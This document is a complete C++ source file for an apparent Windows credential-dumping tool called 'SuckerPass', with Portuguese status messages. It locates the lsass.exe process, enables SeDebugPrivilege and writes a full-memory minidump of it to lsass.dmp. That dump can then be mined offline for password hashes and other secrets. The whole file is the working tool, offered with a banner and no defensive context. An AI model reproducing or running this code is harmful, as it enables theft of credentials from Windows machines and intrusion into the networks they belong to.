#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <iostream>
#include <DbgHelp.h>
#pragma comment (lib, "dbghelp.lib")

void banner() {
    std::cout << R"(
   _____            __             ____                 
  / ___/__  _______/ /_____  _____/ __ \____ ___________
  \__ \/ / / / ___/ //_/ _ \/ ___/ /_/ / __ `/ ___/ ___/
 ___/ / /_/ / /__/ ,< /  __/ /  / ____/ /_/ (__  |__  ) 
/____/\__,_/\___/_/|_|\___/_/  /_/    \__,_/____/____/  
                       By 0xor                                          
                                                  
)" << std::endl;
}

BOOL setPrivilege(LPCTSTR priv) {
    HANDLE token;
    TOKEN_PRIVILEGES tokenPriv;
    LUID luid;

    if (!LookupPrivilegeValue(nullptr, priv, &luid)) {
        std::cerr << "[-] Falha ao obter valor de privilégio. Código de erro: " << GetLastError() << std::endl;
        return FALSE;
    }

    tokenPriv.PrivilegeCount = 1;
    tokenPriv.Privileges[0].Luid = luid;
    tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) {
        std::cerr << "[-] Falha ao abrir token do processo. Código de erro: " << GetLastError() << std::endl;
        return FALSE;
    }

    if (!AdjustTokenPrivileges(token, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
        std::cerr << "[-] Falha ao ajustar privilégio. Código de erro: " << GetLastError() << std::endl;
        CloseHandle(token);
        return FALSE;
    }

    CloseHandle(token);
    return TRUE;
}

BOOL ProcessDump(HANDLE hProcess, const char* dumpFileName) {
    BOOL success = MiniDumpWriteDump(hProcess, GetProcessId(hProcess),
        CreateFileA(dumpFileName, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr),
        MiniDumpWithFullMemory, nullptr, nullptr, nullptr);

    if (!success) {
        std::cerr << "[-] Falha ao criar o despejo do processo. Codigo de erro: " << GetLastError() << std::endl;
    }

    CloseHandle(hProcess);
    return success;
}

DWORD GetProcessIdByName(const TCHAR* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Erro ao criar um snapshot. Codigo de erro: " << GetLastError() << std::endl;
        return 0;
    }

    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_tcsicmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

int main() {
    banner();
    std::cout << "[*] Executando Dump do processo LSASS!";
    const TCHAR* processName = _T("lsass.exe");
    const char* dumpFileName = "lsass.dmp";
    DWORD processId = GetProcessIdByName(processName);

    if (processId != 0) {
        if (setPrivilege(SE_DEBUG_NAME)) {
            HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, processId);

            if (hProcess != nullptr) {
                if (ProcessDump(hProcess, dumpFileName)) {
                    std::cout << "[+] Despejo do LSASS criado com sucesso!" << std::endl;
                }
                CloseHandle(hProcess);
            }
            else {
                std::cerr << "[-] Erro ao abrir o processo do LSASS. Codigo de erro: " << GetLastError() << std::endl;
            }
        }
        else {
            std::cerr << "[-] Falha ao ajustar privilégio [SE_DEBUG_NAME]!" << std::endl;
        }

        std::cout << "[+] Processo do LSASS encontrado. ID do processo: " << processId << std::endl;
    }
    else {
        std::cout << "[-] Processo do LSASS não encontrado." << std::endl;
    }

    return 0;
}
